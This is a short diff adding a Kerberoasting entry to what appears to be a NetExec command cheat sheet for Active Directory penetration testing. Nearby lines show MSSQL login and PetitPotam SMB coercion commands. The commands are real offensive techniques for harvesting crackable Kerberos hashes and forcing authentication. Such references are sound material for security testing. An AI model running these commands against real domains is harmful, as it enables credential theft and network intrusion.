@@ -29,3 +29,7 @@ nxc mssql $DATABASE -u $USER -p $USERPASS
 ```
 nxc smb $IP -M coerce_plus -o METHOD=PetitPotam
 ```
+# Kerberoasting
+```
+nxc ldap $DCIP -u $USER -p $USERPASS --kerberoasting kerberos_out.txt
+```
